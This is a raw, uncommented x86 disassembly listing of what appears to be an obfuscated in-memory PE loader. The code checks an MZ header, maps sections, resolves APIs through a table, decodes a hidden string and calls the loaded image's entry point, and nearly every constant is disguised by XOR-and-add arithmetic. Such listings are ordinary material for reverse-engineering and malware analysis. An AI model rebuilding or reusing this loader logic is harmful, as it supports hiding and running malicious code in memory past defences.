  425fdf:	mov    esi,DWORD PTR [ebp-0x1c]
  425fe2:	mov    edi,DWORD PTR [ebp-0x8]
  425fe5:	mov    ebx,DWORD PTR [ebp+0xc]
  425fe8:	xor    esi,ecx
  425fea:	cmp    edi,DWORD PTR [ebx+esi*8+0x193982c]
  425ff1:	jae    0x42600b
  425ff3:	add    eax,DWORD PTR [ebp-0xc]
  425ff6:	mov    esi,DWORD PTR [ebp-0x4]
  425ff9:	mov    ebx,DWORD PTR [eax+0x4]
  425ffc:	xor    esi,ecx
  425ffe:	add    esi,edx
  426000:	mov    DWORD PTR [ebp-0xc],ebx
  426003:	cmp    ebx,esi
  426005:	jne    0x425f5f
  42600b:	pop    ebx
  42600c:	mov    eax,DWORD PTR [ebp-0x28]
  42600f:	pop    edi
  426010:	jmp    0x426015
  426012:	mov    eax,DWORD PTR [ebp-0x4]
  426015:	xor    eax,ecx
  426017:	add    eax,edx
  426019:	pop    esi
  42601a:	leave  
  42601b:	ret    0x8
  42601e:	push   ebp
  42601f:	mov    ebp,esp
  426021:	sub    esp,0xd8
  426027:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42602e:	mov    DWORD PTR [ebp-0x24],0xf89c85a4
  426035:	mov    eax,DWORD PTR [ebp-0x4]
  426038:	push   ebx
  426039:	push   esi
  42603a:	mov    esi,0x75108af
  42603f:	xor    eax,esi
  426041:	push   edi
  426042:	mov    edi,0x3272f6
  426047:	add    eax,edi
  426049:	mov    DWORD PTR [ebp-0x18],eax
  42604c:	mov    eax,DWORD PTR [ebp-0x4]
  42604f:	xor    eax,esi
  426051:	add    eax,edi
  426053:	mov    DWORD PTR [ebp-0x8],eax
  426056:	mov    ebx,DWORD PTR [ebp+0x20]
  426059:	mov    eax,DWORD PTR [ebp-0x1c]
  42605c:	mov    ecx,DWORD PTR [ebp-0x1c]
  42605f:	xor    eax,ecx
  426061:	mov    DWORD PTR [ebp-0x1c],eax
  426064:	add    DWORD PTR [ebp-0x1c],0xf89cb5a5
  42606b:	mov    eax,DWORD PTR [ebp-0xc]
  42606e:	mov    ecx,DWORD PTR [ebp-0xc]
  426071:	xor    eax,ecx
  426073:	mov    DWORD PTR [ebp-0xc],eax
  426076:	add    DWORD PTR [ebp-0xc],0xf89c85e5
  42607d:	mov    eax,DWORD PTR [ebp-0x10]
  426080:	mov    ecx,DWORD PTR [ebp-0x10]
  426083:	xor    eax,ecx
  426085:	mov    DWORD PTR [ebp-0x10],eax
  426088:	add    DWORD PTR [ebp-0x10],0xf89c85a1
  42608f:	mov    eax,DWORD PTR [ebp-0x28]
  426092:	mov    ecx,DWORD PTR [ebp-0x28]
  426095:	xor    eax,ecx
  426097:	mov    DWORD PTR [ebp-0x28],eax
  42609a:	add    DWORD PTR [ebp-0x28],0xf89f05a5
  4260a1:	mov    DWORD PTR [ebp+0x20],0xf89ceff8
  4260a8:	mov    eax,DWORD PTR [ebp+0x8]
  4260ab:	test   eax,eax
  4260ad:	je     0x426534
  4260b3:	mov    eax,DWORD PTR [ebp+0xc]
  4260b6:	test   eax,eax
  4260b8:	je     0x426534
  4260be:	mov    eax,DWORD PTR [ebp+0x18]
  4260c1:	test   eax,eax
  4260c3:	je     0x426534
  4260c9:	mov    eax,DWORD PTR [ebp+0x20]
  4260cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4260cf:	xor    eax,0x8af
  4260d4:	add    eax,0x72f6
  4260d9:	cmp    WORD PTR [ecx],ax
  4260dc:	jne    0x426534
  4260e2:	mov    eax,DWORD PTR [ebp-0x4]
  4260e5:	xor    eax,esi
  4260e7:	add    eax,edi
  4260e9:	mov    DWORD PTR [ebp-0x30],eax
  4260ec:	mov    eax,DWORD PTR [ebp-0x4]
  4260ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4260f2:	mov    eax,DWORD PTR [ebp+0x8]
  4260f5:	add    eax,DWORD PTR [ecx+0x3c]
  4260f8:	mov    DWORD PTR [ebp+0xc],eax
  4260fb:	mov    eax,DWORD PTR [eax+0x50]
  4260fe:	test   eax,eax
  426100:	je     0x426534
  426106:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  42610d:	mov    eax,DWORD PTR [ebp-0x2c]
  426110:	xor    eax,esi
  426112:	add    eax,edi
  426114:	mov    DWORD PTR [ebp-0x2c],eax
  426117:	mov    eax,DWORD PTR [ebp-0x4]
  42611a:	mov    eax,DWORD PTR [ebx+0x190]
  426120:	mov    ecx,DWORD PTR [eax]
  426122:	mov    ecx,DWORD PTR [ecx+0x3c]
  426125:	add    ecx,DWORD PTR [eax]
  426127:	mov    eax,DWORD PTR [ebp-0x4]
  42612a:	mov    eax,DWORD PTR [ebx+0x18c]
  426130:	mov    edx,DWORD PTR [eax]
  426132:	mov    DWORD PTR [ebp-0x20],ecx
  426135:	mov    DWORD PTR [ebp+0x20],edx
  426138:	cmp    edx,edx
  42613a:	jne    0x42616e
  42613c:	mov    eax,DWORD PTR [ebx+0x1e0]
  426142:	lea    edx,[ebp-0x18]
  426145:	push   edx
  426146:	mov    edx,DWORD PTR [ebp-0xc]
  426149:	xor    edx,esi
  42614b:	add    edx,edi
  42614d:	push   edx
  42614e:	push   DWORD PTR [ecx+0x50]
  426151:	push   DWORD PTR [ebp+0x20]
  426154:	call   DWORD PTR [eax+0x1c]
  426157:	mov    eax,DWORD PTR [ebp-0x20]
  42615a:	mov    ecx,DWORD PTR [eax+0x54]
  42615d:	mov    eax,DWORD PTR [eax+0x50]
  426160:	sub    eax,ecx
  426162:	add    ecx,DWORD PTR [ebp+0x20]
  426165:	push   ecx
  426166:	call   0x426ad1
  42616b:	mov    edx,DWORD PTR [ebp+0x20]
  42616e:	mov    eax,DWORD PTR [ebx+0x194]
  426174:	mov    DWORD PTR [eax],edx
  426176:	mov    eax,DWORD PTR [ebp+0xc]
  426179:	push   DWORD PTR [eax+0x54]
  42617c:	push   DWORD PTR [ebp+0x8]
  42617f:	push   edx
  426180:	call   0x4269c7
  426185:	mov    ecx,DWORD PTR [ebp+0x20]
  426188:	mov    eax,DWORD PTR [ecx+0x3c]
  42618b:	add    eax,ecx
  42618d:	movzx  ecx,WORD PTR [eax+0x14]
  426191:	lea    ecx,[ecx+eax*1+0x18]
  426195:	mov    DWORD PTR [ebp+0x18],ecx
  426198:	mov    ecx,DWORD PTR [ebp-0x4]
  42619b:	movzx  edx,WORD PTR [eax+0x6]
  42619f:	xor    ecx,esi
  4261a1:	add    ecx,edi
  4261a3:	mov    DWORD PTR [ebp+0xc],eax
  4261a6:	cmp    edx,ecx
  4261a8:	je     0x426255
  4261ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4261b1:	xor    ecx,esi
  4261b3:	add    ecx,edi
  4261b5:	mov    DWORD PTR [ebp-0x8],ecx
  4261b8:	mov    ecx,DWORD PTR [ebp-0x24]
  4261bb:	movzx  edx,WORD PTR [eax+0x6]
  4261bf:	xor    ecx,esi
  4261c1:	sub    edx,ecx
  4261c3:	sub    edx,edi
  4261c5:	cmp    DWORD PTR [ebp-0x8],edx
  4261c8:	ja     0x426255
  4261ce:	mov    edx,DWORD PTR [ebp+0x18]
  4261d1:	add    edx,0x8
  4261d4:	mov    DWORD PTR [ebp+0x18],edx
  4261d7:	jmp    0x4261dc
  4261d9:	mov    edx,DWORD PTR [ebp+0x18]
  4261dc:	mov    eax,DWORD PTR [eax+0x38]
  4261df:	lea    ecx,[eax-0x1]
  4261e2:	mov    DWORD PTR [ebp-0x38],eax
  4261e5:	mov    eax,DWORD PTR [edx]
  4261e7:	test   eax,ecx
  4261e9:	je     0x4261f2
  4261eb:	not    ecx
  4261ed:	and    eax,ecx
  4261ef:	add    eax,DWORD PTR [ebp-0x38]
  4261f2:	mov    ecx,DWORD PTR [edx+0x4]
  4261f5:	add    ecx,DWORD PTR [ebp+0x20]
  4261f8:	push   ecx
  4261f9:	call   0x426ad1
  4261fe:	mov    edx,DWORD PTR [ebp-0x4]
  426201:	mov    eax,DWORD PTR [ebp+0x18]
  426204:	mov    ecx,DWORD PTR [eax+0x8]
  426207:	xor    edx,esi
  426209:	add    edx,edi
  42620b:	cmp    ecx,edx
  42620d:	je     0x426226
  42620f:	push   ecx
  426210:	mov    ecx,DWORD PTR [ebp+0x8]
  426213:	add    ecx,DWORD PTR [eax+0xc]
  426216:	mov    eax,DWORD PTR [eax+0x4]
  426219:	add    eax,DWORD PTR [ebp+0x20]
  42621c:	push   ecx
  42621d:	push   eax
  42621e:	call   0x4269c7
  426223:	mov    eax,DWORD PTR [ebp+0x18]
  426226:	mov    ecx,DWORD PTR [ebp-0x24]
  426229:	mov    edx,DWORD PTR [ebp-0x8]
  42622c:	add    eax,0x28
  42622f:	xor    ecx,esi
  426231:	lea    ecx,[edx+ecx*1+0x3272f6]
  426238:	mov    edx,DWORD PTR [ebp+0xc]
  42623b:	mov    DWORD PTR [ebp+0x18],eax
  42623e:	mov    eax,DWORD PTR [ebp-0x24]
  426241:	movzx  edx,WORD PTR [edx+0x6]
  426245:	xor    eax,esi
  426247:	sub    edx,eax
  426249:	mov    eax,DWORD PTR [ebp+0xc]
  42624c:	sub    edx,edi
  42624e:	mov    DWORD PTR [ebp-0x8],ecx
  426251:	cmp    ecx,edx
  426253:	jbe    0x4261d9
  426255:	mov    edx,DWORD PTR [ebx+0x18c]
  42625b:	mov    ecx,DWORD PTR [ebp+0x20]
  42625e:	cmp    ecx,DWORD PTR [edx]
  426260:	jne    0x426289
  426262:	mov    eax,DWORD PTR [ebx+0x1e0]
  426268:	lea    edx,[ebp-0x18]
  42626b:	push   edx
  42626c:	mov    edx,DWORD PTR [ebp-0x10]
  42626f:	xor    edx,esi
  426271:	add    edx,edi
  426273:	push   edx
  426274:	mov    edx,DWORD PTR [ebp-0x20]
  426277:	push   DWORD PTR [edx+0x54]
  42627a:	push   ecx
  42627b:	call   DWORD PTR [eax+0x1c]
  42627e:	test   eax,eax
  426280:	je     0x426525
  426286:	mov    eax,DWORD PTR [ebp+0xc]
  426289:	mov    ecx,DWORD PTR [ebx+0x1c8]
  42628f:	mov    ecx,DWORD PTR [ecx]
  426291:	xor    ecx,esi
  426293:	add    ecx,edi
  426295:	je     0x426450
  42629b:	mov    eax,DWORD PTR [ebp-0x4]
  42629e:	xor    eax,esi
  4262a0:	add    eax,edi
  4262a2:	and    DWORD PTR [ebp+0x8],0x0
  4262a6:	mov    DWORD PTR [ebp-0x14],eax
  4262a9:	mov    eax,0xf89c85c1
  4262ae:	lea    ecx,[eax+0x18]
  4262b1:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  4262b8:	mov    DWORD PTR [ebp-0x54],0xf89c85d1
  4262bf:	mov    DWORD PTR [ebp-0x50],eax
  4262c2:	mov    DWORD PTR [ebp-0x4c],ecx
  4262c5:	mov    DWORD PTR [ebp-0x48],ecx
  4262c8:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  4262cf:	mov    edx,DWORD PTR [ebp+0x8]
  4262d2:	mov    ecx,0x8af
  4262d7:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  4262dc:	mov    edx,0x72f6
  4262e1:	add    cx,dx
  4262e4:	mov    edx,DWORD PTR [ebp+0x8]
  4262e7:	inc    DWORD PTR [ebp+0x8]
  4262ea:	cmp    DWORD PTR [ebp+0x8],0x6
  4262ee:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  4262f6:	jb     0x4262cf
  4262f8:	mov    ecx,0xf89c85d3
  4262fd:	mov    DWORD PTR [ebp-0xb0],eax
  426303:	mov    DWORD PTR [ebp-0x9c],eax
  426309:	mov    DWORD PTR [ebp-0x74],eax
  42630c:	mov    DWORD PTR [ebp-0x70],eax
  42630f:	lea    eax,[ecx-0x1]
  426312:	lea    edx,[ecx+0x2c]
  426315:	mov    DWORD PTR [ebp-0x64],eax
  426318:	mov    DWORD PTR [ebp-0x60],eax
  42631b:	mov    DWORD PTR [ebp-0xb4],0xf89c85f9
  426325:	mov    DWORD PTR [ebp-0xac],ecx
  42632b:	mov    DWORD PTR [ebp-0xa8],edx
  426331:	mov    DWORD PTR [ebp-0xa4],0xf89c85dc
  42633b:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  426345:	mov    DWORD PTR [ebp-0x98],0xf89c85e0
  42634f:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  426359:	mov    DWORD PTR [ebp-0x90],0xf89c85d1
  426363:	mov    DWORD PTR [ebp-0x8c],ecx
  426369:	mov    DWORD PTR [ebp-0x88],0xf89c852c
  426373:	mov    DWORD PTR [ebp-0x84],edx
  426379:	mov    DWORD PTR [ebp-0x80],0xf89c85d6
  426380:	mov    DWORD PTR [ebp-0x7c],ecx
  426383:	mov    DWORD PTR [ebp-0x78],0xf89c85e4
  42638a:	mov    DWORD PTR [ebp-0x6c],ecx
  42638d:	mov    DWORD PTR [ebp-0x68],0xf89c85c0
  426394:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  42639b:	xor    eax,eax
  42639d:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4263a4:	xor    cl,0xaf
  4263a7:	sub    cl,0xa
  4263aa:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4263b1:	inc    eax
  4263b2:	cmp    eax,0x17
  4263b5:	jb     0x42639d
  4263b7:	mov    eax,DWORD PTR [ebx+0x1e0]
  4263bd:	lea    ecx,[ebp-0xc0]
  4263c3:	push   ecx
  4263c4:	call   DWORD PTR [eax+0x4]
  4263c7:	mov    ecx,DWORD PTR [ebx+0x1e0]
  4263cd:	lea    edx,[ebp-0xd8]
  4263d3:	push   edx
  4263d4:	push   eax
  4263d5:	call   DWORD PTR [ecx+0x8]
  4263d8:	mov    DWORD PTR [ebp-0x40],eax
  4263db:	lea    eax,[ebp-0x14]
  4263de:	push   eax
  4263df:	mov    eax,DWORD PTR [ebx+0x18c]
  4263e5:	push   DWORD PTR [eax]
  4263e7:	mov    eax,DWORD PTR [ebp-0x40]
  4263ea:	call   eax
  4263ec:	mov    eax,DWORD PTR [ebp-0x4]
  4263ef:	xor    eax,esi
  4263f1:	add    eax,edi
  4263f3:	mov    DWORD PTR [ebp-0x34],eax
  4263f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4263f9:	mov    eax,DWORD PTR [ebp-0x14]
  4263fc:	xor    ecx,esi
  4263fe:	add    ecx,edi
  426400:	cmp    eax,ecx
  426402:	je     0x42644d
  426404:	mov    DWORD PTR [ebp-0x3c],eax
  426407:	jmp    0x426418
  426409:	mov    eax,DWORD PTR [eax]
  42640b:	mov    ecx,DWORD PTR [ebp-0x3c]
  42640e:	mov    DWORD PTR [ebp-0x14],eax
  426411:	mov    eax,DWORD PTR [ebp-0x14]
  426414:	cmp    eax,ecx
  426416:	je     0x426425
  426418:	mov    edx,DWORD PTR [eax+0x18]
  42641b:	mov    ecx,DWORD PTR [ebx+0x18c]
  426421:	cmp    edx,DWORD PTR [ecx]
  426423:	jne    0x426409
  426425:	mov    ecx,DWORD PTR [ebx+0x18c]
  42642b:	mov    edx,DWORD PTR [eax+0x18]
  42642e:	cmp    edx,DWORD PTR [ecx]
  426430:	jne    0x42644d
  426432:	mov    ecx,DWORD PTR [ebx+0x190]
  426438:	mov    edx,DWORD PTR [ebp-0x20]
  42643b:	mov    edx,DWORD PTR [edx+0x28]
  42643e:	add    edx,DWORD PTR [ecx]
  426440:	mov    DWORD PTR [eax+0x1c],edx
  426443:	mov    eax,DWORD PTR [ebp-0x24]
  426446:	xor    eax,esi
  426448:	add    eax,edi
  42644a:	mov    DWORD PTR [ebp-0x34],eax
  42644d:	mov    eax,DWORD PTR [ebp+0xc]
  426450:	push   ebx
  426451:	push   eax
  426452:	push   DWORD PTR [ebp+0x20]
  426455:	call   0x425bd5
  42645a:	test   eax,eax
  42645c:	je     0x426525
  426462:	push   DWORD PTR [ebp+0xc]
  426465:	mov    ecx,ebx
  426467:	push   DWORD PTR [ebp+0x20]
  42646a:	call   0x425b2e
  42646f:	test   eax,eax
  426471:	je     0x426525
  426477:	mov    eax,DWORD PTR [ebp+0xc]
  42647a:	mov    edx,DWORD PTR [ebp+0x20]
  42647d:	mov    ecx,ebx
  42647f:	call   0x425a07
  426484:	test   eax,eax
  426486:	je     0x426525
  42648c:	push   ebx
  42648d:	push   DWORD PTR [ebp+0x20]
  426490:	call   0x425eb8
  426495:	test   eax,eax
  426497:	je     0x426525
  42649d:	mov    eax,DWORD PTR [ebx+0x18c]
  4264a3:	mov    edx,DWORD PTR [ebp+0x20]
  4264a6:	cmp    edx,DWORD PTR [eax]
  4264a8:	jne    0x4264c4
  4264aa:	mov    eax,DWORD PTR [ebx+0x1e0]
  4264b0:	lea    ecx,[ebp-0x18]
  4264b3:	push   ecx
  4264b4:	push   DWORD PTR [ebp-0x18]
  4264b7:	mov    ecx,DWORD PTR [ebp-0x20]
  4264ba:	push   DWORD PTR [ecx+0x54]
  4264bd:	push   edx
  4264be:	call   DWORD PTR [eax+0x1c]
  4264c1:	mov    edx,DWORD PTR [ebp+0x20]
  4264c4:	mov    eax,DWORD PTR [ebx+0x1c8]
  4264ca:	mov    eax,DWORD PTR [eax]
  4264cc:	xor    eax,esi
  4264ce:	add    eax,edi
  4264d0:	je     0x426509
  4264d2:	mov    ecx,DWORD PTR [ebp+0xc]
  4264d5:	mov    eax,DWORD PTR [ecx+0x28]
  4264d8:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  4264df:	mov    esi,DWORD PTR [ebp+0x8]
  4264e2:	push   DWORD PTR [ebp+0x14]
  4264e5:	xor    esi,0x8af
  4264eb:	push   DWORD PTR [ebp+0x10]
  4264ee:	add    esi,0x72f6
  4264f4:	or     WORD PTR [ecx+0x16],si
  4264f8:	add    eax,edx
  4264fa:	push   edx
  4264fb:	call   eax
  4264fd:	mov    DWORD PTR [ebx+0x1d0],0xf89c85a4
  426507:	jmp    0x426513
  426509:	mov    eax,DWORD PTR [ebp+0xc]
  42650c:	mov    eax,DWORD PTR [eax+0x28]
  42650f:	add    eax,edx
  426511:	call   eax
  426513:	mov    DWORD PTR [ebp-0x8],eax
  426516:	mov    eax,DWORD PTR [ebp-0x8]
  426519:	mov    ecx,DWORD PTR [ebp+0x1c]
  42651c:	mov    DWORD PTR [ecx],eax
  42651e:	mov    DWORD PTR [ebp-0x30],0x1
  426525:	cmp    DWORD PTR [ebp-0x30],0x0
  426529:	jne    0x42652f
  42652b:	and    DWORD PTR [ebp+0x20],0x0
  42652f:	mov    eax,DWORD PTR [ebp+0x20]
  426532:	jmp    0x426536
  426534:	xor    eax,eax
  426536:	pop    edi
  426537:	pop    esi
  426538:	pop    ebx
  426539:	leave  
  42653a:	ret    0x1c
  42653d:	push   ebp
  42653e:	mov    ebp,esp
  426540:	movzx  edx,WORD PTR [ecx+0x6]
  426544:	movzx  eax,WORD PTR [ecx+0x14]
  426548:	push   ebx
  426549:	push   edi
  42654a:	xor    edi,edi
  42654c:	lea    eax,[eax+ecx*1+0x18]
  426550:	test   edx,edx
  426552:	je     0x426573
  426554:	mov    ecx,DWORD PTR [eax+0xc]
  426557:	lea    ebx,[ecx+esi*1]
  42655a:	cmp    DWORD PTR [ebp+0x8],ebx
  42655d:	jb     0x42656b
  42655f:	mov    ebx,DWORD PTR [eax+0x8]
  426562:	add    ebx,ecx
  426564:	add    ebx,esi
  426566:	cmp    DWORD PTR [ebp+0x8],ebx
  426569:	jb     0x426575
  42656b:	add    eax,0x28
  42656e:	inc    edi
  42656f:	cmp    edi,edx
  426571:	jb     0x426554
  426573:	xor    eax,eax
  426575:	pop    edi
  426576:	pop    ebx
  426577:	pop    ebp
  426578:	ret    0x4
  42657b:	push   ebp
  42657c:	mov    ebp,esp
  42657e:	sub    esp,0x34
  426581:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  426588:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42658f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a3
  426596:	mov    DWORD PTR [ebp-0x8],0xf89c85c4
  42659d:	mov    DWORD PTR [ebp-0x20],0xf89c85e4
  4265a4:	mov    DWORD PTR [ebp-0x2c],0xf89c852b
  4265ab:	mov    DWORD PTR [ebp-0x2c],0xf89c85cb
  4265b2:	mov    DWORD PTR [ebp-0x10],eax
  4265b5:	mov    eax,DWORD PTR [ebp+0x8]
  4265b8:	mov    DWORD PTR [ebp-0x14],eax
  4265bb:	mov    eax,DWORD PTR [ebp-0xc]
  4265be:	push   ebx
  4265bf:	mov    ecx,0x75108af
  4265c4:	xor    eax,ecx
  4265c6:	push   esi
  4265c7:	mov    esi,DWORD PTR [ebp-0x10]
  4265ca:	mov    edx,0x3272f6
  4265cf:	add    eax,edx
  4265d1:	push   edi
  4265d2:	cmp    esi,eax
  4265d4:	je     0x4267b3
  4265da:	mov    eax,DWORD PTR [ebp-0xc]
  4265dd:	mov    esi,DWORD PTR [ebp-0x14]
  4265e0:	xor    eax,ecx
  4265e2:	add    eax,edx
  4265e4:	cmp    esi,eax
  4265e6:	je     0x4267b3
  4265ec:	mov    eax,DWORD PTR [ebp-0xc]
  4265ef:	xor    eax,ecx
  4265f1:	add    eax,edx
  4265f3:	mov    DWORD PTR [ebp-0x24],eax
  4265f6:	mov    eax,DWORD PTR [ebp-0xc]
  4265f9:	xor    eax,ecx
  4265fb:	add    eax,edx
  4265fd:	mov    DWORD PTR [ebp-0x28],eax
  426600:	mov    edi,DWORD PTR [ebp-0x20]
  426603:	mov    ebx,DWORD PTR [ebp-0x8]
  426606:	mov    esi,0x8af
  42660b:	xor    edi,esi
  42660d:	mov    eax,0x72f6
  426612:	xor    ebx,esi
  426614:	add    edi,eax
  426616:	add    ebx,eax
  426618:	sub    ebx,edi
  42661a:	mov    WORD PTR [ebp-0x8],bx
  42661e:	jmp    0x4266e3
  426623:	mov    edi,DWORD PTR [ebp-0xc]
  426626:	mov    bx,WORD PTR [ebp-0x4]
  42662a:	xor    edi,esi
  42662c:	add    edi,eax
  42662e:	cmp    bx,di
  426631:	je     0x426725
  426637:	mov    edi,DWORD PTR [ebp-0xc]
  42663a:	mov    ebx,DWORD PTR [ebp+0xc]
  42663d:	xor    edi,ecx
  42663f:	add    edi,edx
  426641:	cmp    ebx,edi
  426643:	mov    di,WORD PTR [ebp-0x4]
  426647:	mov    bx,WORD PTR [ebp+0x8]
  42664b:	je     0x4266b6
  42664d:	cmp    bx,di
  426650:	je     0x4266bf
  426652:	mov    edi,DWORD PTR [ebp-0x20]
  426655:	mov    bx,WORD PTR [ebp+0x8]
  426659:	xor    edi,esi
  42665b:	add    edi,eax
  42665d:	cmp    bx,di
  426660:	jb     0x426680
  426662:	mov    edi,DWORD PTR [ebp-0x2c]
  426665:	mov    bx,WORD PTR [ebp+0x8]
  426669:	xor    edi,esi
  42666b:	add    edi,eax
  42666d:	cmp    bx,di
  426670:	ja     0x426680
  426672:	movzx  edi,WORD PTR [ebp+0x8]
  426676:	movzx  ebx,WORD PTR [ebp-0x8]
  42667a:	add    edi,ebx
  42667c:	mov    WORD PTR [ebp+0x8],di
  426680:	mov    edi,DWORD PTR [ebp-0x20]
  426683:	mov    bx,WORD PTR [ebp-0x4]
  426687:	xor    edi,esi
  426689:	add    edi,eax
  42668b:	cmp    bx,di
  42668e:	jb     0x4266ae
  426690:	mov    edi,DWORD PTR [ebp-0x2c]
  426693:	mov    bx,WORD PTR [ebp-0x4]
  426697:	xor    edi,esi
  426699:	add    edi,eax
  42669b:	cmp    bx,di
  42669e:	ja     0x4266ae
  4266a0:	movzx  edi,WORD PTR [ebp-0x4]
  4266a4:	movzx  ebx,WORD PTR [ebp-0x8]
  4266a8:	add    edi,ebx
  4266aa:	mov    WORD PTR [ebp-0x4],di
  4266ae:	mov    di,WORD PTR [ebp-0x4]
  4266b2:	mov    bx,WORD PTR [ebp+0x8]
  4266b6:	cmp    bx,di
  4266b9:	jne    0x4267b3
  4266bf:	mov    edi,DWORD PTR [ebp-0x1c]
  4266c2:	mov    ebx,DWORD PTR [ebp-0x10]
  4266c5:	xor    edi,ecx
  4266c7:	lea    edi,[edi+ebx*1+0x3272f6]
  4266ce:	mov    DWORD PTR [ebp-0x10],edi
  4266d1:	mov    edi,DWORD PTR [ebp-0x1c]
  4266d4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266d7:	xor    edi,ecx
  4266d9:	lea    edi,[edi+ebx*1+0x3272f6]
  4266e0:	mov    DWORD PTR [ebp-0x14],edi
  4266e3:	mov    edi,DWORD PTR [ebp-0x24]
  4266e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4266e9:	mov    di,WORD PTR [ebx+edi*2]
  4266ed:	mov    WORD PTR [ebp+0x8],di
  4266f1:	mov    edi,DWORD PTR [ebp-0x28]
  4266f4:	mov    ebx,DWORD PTR [ebp-0x14]
  4266f7:	mov    di,WORD PTR [ebx+edi*2]
  4266fb:	mov    WORD PTR [ebp-0x4],di
  4266ff:	mov    edi,DWORD PTR [ebp-0xc]
  426702:	mov    bx,WORD PTR [ebp+0x8]
  426706:	xor    edi,esi
  426708:	add    edi,eax
  42670a:	cmp    bx,di
  42670d:	jne    0x426623
  426713:	mov    eax,DWORD PTR [ebp-0x18]
  426716:	mov    esi,DWORD PTR [ebp-0xc]
  426719:	xor    eax,ecx
  42671b:	add    eax,edx
  42671d:	imul   eax,esi
  426720:	mov    DWORD PTR [ebp-0xc],eax
  426723:	jmp    0x426737
  426725:	mov    eax,DWORD PTR [ebp-0xc]
  426728:	mov    esi,DWORD PTR [ebp-0x18]
  42672b:	xor    eax,ecx
  42672d:	lea    eax,[eax+esi*1+0x3272f6]
  426734:	mov    DWORD PTR [ebp-0x18],eax
  426737:	mov    eax,DWORD PTR [ebp-0x24]
  42673a:	sub    eax,edx
  42673c:	xor    eax,ecx
  42673e:	mov    DWORD PTR [ebp-0x30],eax
  426741:	mov    eax,DWORD PTR [ebp-0x28]
  426744:	sub    eax,edx
  426746:	xor    eax,ecx
  426748:	mov    DWORD PTR [ebp-0x34],eax
  42674b:	mov    eax,DWORD PTR [ebp-0x34]
  42674e:	mov    esi,DWORD PTR [ebp-0x1c]
  426751:	xor    esi,ecx
  426753:	add    esi,edx
  426755:	xor    eax,ecx
  426757:	add    eax,0x3272f6
  42675c:	imul   esi,eax
  42675f:	mov    eax,DWORD PTR [ebp-0x14]
  426762:	movzx  eax,WORD PTR [esi+eax*1]
  426766:	mov    esi,DWORD PTR [ebp-0x30]
  426769:	mov    edi,DWORD PTR [ebp-0x1c]
  42676c:	xor    esi,ecx
  42676e:	add    esi,edx
  426770:	xor    edi,ecx
  426772:	add    edi,edx
  426774:	imul   edi,esi
  426777:	mov    esi,DWORD PTR [ebp-0x10]
  42677a:	movzx  esi,WORD PTR [edi+esi*1]
  42677e:	sub    eax,edx
  426780:	sub    esi,edx
  426782:	xor    eax,ecx
  426784:	xor    esi,ecx
  426786:	cmp    esi,eax
  426788:	jne    0x4267b3
  42678a:	mov    eax,DWORD PTR [ebp-0x30]
  42678d:	mov    esi,DWORD PTR [ebp-0x1c]
  426790:	xor    eax,ecx
  426792:	add    eax,0x3272f6
  426797:	xor    esi,ecx
  426799:	add    esi,edx
  42679b:	imul   esi,eax
  42679e:	mov    eax,DWORD PTR [ebp-0x10]
  4267a1:	movzx  eax,WORD PTR [esi+eax*1]
  4267a5:	mov    esi,DWORD PTR [ebp-0xc]
  4267a8:	sub    eax,edx
  4267aa:	xor    eax,ecx
  4267ac:	cmp    eax,esi
  4267ae:	mov    eax,DWORD PTR [ebp-0xc]
  4267b1:	je     0x4267b6
  4267b3:	mov    eax,DWORD PTR [ebp-0x18]
  4267b6:	pop    edi
  4267b7:	xor    eax,ecx
  4267b9:	pop    esi
  4267ba:	add    eax,edx
  4267bc:	pop    ebx
  4267bd:	leave  
  4267be:	ret    0x8
  4267c1:	push   ebp
  4267c2:	mov    ebp,esp
  4267c4:	push   ecx
  4267c5:	mov    cx,WORD PTR [eax]
  4267c8:	push   esi
  4267c9:	mov    esi,0x3b5d
  4267ce:	sub    cx,si
  4267d1:	mov    esi,0x8a9b
  4267d6:	xor    cx,si
  4267d9:	mov    esi,0x4e38
  4267de:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  4267e5:	mov    edx,0xf89c85a5
  4267ea:	cmp    cx,si
  4267ed:	je     0x42684c
  4267ef:	push   ebx
  4267f0:	push   edi
  4267f1:	movzx  ecx,cx
  4267f4:	mov    edi,0xffcd8d0a
  4267f9:	mov    esi,0x75108af
  4267fe:	mov    ebx,0x4e64
  426803:	cmp    cx,bx
  426806:	jne    0x42680b
  426808:	mov    DWORD PTR [ebp-0x4],edx
  42680b:	lea    edx,[edi+0x1]
  42680e:	xor    edx,esi
  426810:	mov    edi,edx
  426812:	xor    edi,esi
  426814:	mov    cx,WORD PTR [eax+edi*2+0x64e5ec]
  42681c:	mov    ebx,0x3b5d
  426821:	sub    cx,bx
  426824:	mov    ebx,0x8a9b
  426829:	xor    cx,bx
  42682c:	mov    ebx,0x4e38
  426831:	cmp    cx,bx
  426834:	jne    0x4267fe
  426836:	mov    ecx,DWORD PTR [ebp-0x4]
  426839:	pop    edi
  42683a:	pop    ebx
  42683b:	cmp    ecx,0xf89c85a6
  426841:	je     0x42684c
  426843:	xor    ecx,esi
  426845:	lea    eax,[eax+ecx*2+0x64e5ee]
  42684c:	pop    esi
  42684d:	leave  
  42684e:	ret    
  42684f:	push   ebp
  426850:	mov    ebp,esp
  426852:	push   ecx
  426853:	push   esi
  426854:	push   edi
  426855:	mov    DWORD PTR [ebp-0x4],0xf89c85a6
  42685c:	mov    esi,0xf89c85a5
  426861:	call   0x4267c1
  426866:	mov    edi,eax
  426868:	mov    al,BYTE PTR [edi]
  42686a:	sub    al,0x4
